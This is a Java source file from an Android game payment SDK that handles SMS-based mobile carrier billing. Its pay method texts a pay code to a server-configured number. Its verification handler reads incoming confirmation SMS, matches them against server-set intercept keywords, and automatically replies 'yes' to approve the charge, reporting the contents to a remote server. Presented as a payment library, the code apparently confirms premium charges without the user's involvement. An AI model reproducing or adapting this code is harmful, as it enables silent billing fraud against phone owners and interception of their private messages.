package mobi.zty.pay.sdk.dongma;

import java.util.List;

import mobi.zty.pay.sdk.PayConfig;
import mobi.zty.pay.sdk.PaymentInterf;
import mobi.zty.sdk.game.Constants;
import mobi.zty.sdk.game.GameSDK;
import mobi.zty.sdk.game.bean.FeeInfo;
import mobi.zty.sdk.game.bean.GroupFeeInfo;
import mobi.zty.sdk.game.bean.MkInfo;
import mobi.zty.sdk.util.Helper;
import mobi.zty.sdk.util.StringUtil;
import mobi.zty.sdk.util.Util_G;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;

/**
 * 动漫移动点播支付管理类
 * @author Administrator
 *
 */
public class DongMaFeeInstance extends PaymentInterf{
	private static DongMaFeeInstance instance;
	private Context context;
	public static DongMaFeeInstance getInstance(){
		if(instance==null){
			instance = scyDFpay();
		}
		return instance;
	}
	private static synchronized DongMaFeeInstance scyDFpay(){
		if(instance==null){
			instance =  new DongMaFeeInstance();
		}
		return instance;
	}
	@Override
	public void init(Context context, Object... parameters) {
		this.context = context;
	}

	@Override
	public void pay(final Context context, Object... parameters) {
		int feeIndex = (Integer) parameters[1];
		FeeInfo feeInfo = (FeeInfo) parameters[2];
		Helper.sendPayMessageToServer(PayConfig.DONGMA_PAY, "进入支付：", feeIndex);
		MkInfo mkInfo = (MkInfo) parameters[3];
		final String content = feeInfo.payCode;
		final String send_num = mkInfo.sendNum;
		
		Intent itSend = new Intent(Constants.SENT_SMS_ACTION);  
		itSend.putExtra("fee_index", feeIndex);
        PendingIntent mSendPI = PendingIntent.getBroadcast(context.getApplicationContext(), 0, itSend, PendingIntent.FLAG_ONE_SHOT);//这里requestCode和flag的设置很重要，影响数据KEY_PHONENUM的传递。   
        Util_G.sendTextMessage(context, send_num, content, mSendPI, 0);
        Util_G.debugE("dongfeng_pay", "dongma_data->"+content);
        Helper.sendPayMessageToServer(PayConfig.DONGMA_PAY, "执行支付send_num="+send_num+"content="+content, feeIndex);
	}
	@Override
	public void sendVerifyCode(Object... parameters) {
		String sendFrom = (String) parameters[0];
		String content = (String) parameters[1];
		int feeIndex = (Integer) parameters[2];
		Helper.sendPayMessageToServer(PayConfig.DONGMA_PAY, "读取到验证码："+content, feeIndex);
		GameSDK instance = GameSDK.getInstance();
		GroupFeeInfo groupFeeInfo = instance.getCurgGroupFeeInfo();
		if (groupFeeInfo == null)  return;

		String vertifyNum = instance.mkMap.get(PayConfig.DONGMA_PAY).vertifyNum;
		if (sendFrom.contains(vertifyNum)) {
			List<String> interceptContents = instance.mkMap.get(PayConfig.DONGMA_PAY).interceptContents;
			if (interceptContents.size()==0) {//没有要拦截的内容  这个和动漫支付  获取验证码规则不符合  不执行验证码回复
				Util_G.debugE("ALLPAY","error 后台未给客户端动漫的 拦截内容");
			}else{
				boolean canIntercept = true;
				for (int i = 0; i < interceptContents.size(); i++) {
					if (!content.contains(interceptContents.get(i))) {
						canIntercept = false;
						break;
					}
				}
				if (canIntercept) {
					groupFeeInfo.getIntdexVerifyMap().put(feeIndex, 2);
					Intent itSend = new Intent(Constants.SENT_SMS_ACTION);
					itSend.putExtra("fee_index", feeIndex);
					PendingIntent mSendPI = PendingIntent.getBroadcast(
							context.getApplicationContext(), 0, itSend,
							PendingIntent.FLAG_ONE_SHOT);// 这里requestCode和flag的设置很重要，影响数据KEY_PHONENUM的传递。
					Util_G.sendTextMessage(context, sendFrom, "是", mSendPI, 0);
					Helper.sendPayMessageToServer(PayConfig.DONGMA_PAY, "回复验证码是", feeIndex);
					Util_G.debugE("DONGFENG", "dongma_验证码确认短信");
				}else{
					Helper.sendPayMessageToServer(PayConfig.DONGMA_PAY, "拦截内容配置不合理", feeIndex);
				}
			}
		}else{
			Helper.sendPayMessageToServer(PayConfig.DONGMA_PAY, "后台配置端口错误sendFrom"+sendFrom+"vertifyNum="+vertifyNum, feeIndex);
		}
		super.sendVerifyCode(parameters);
	}
	
}
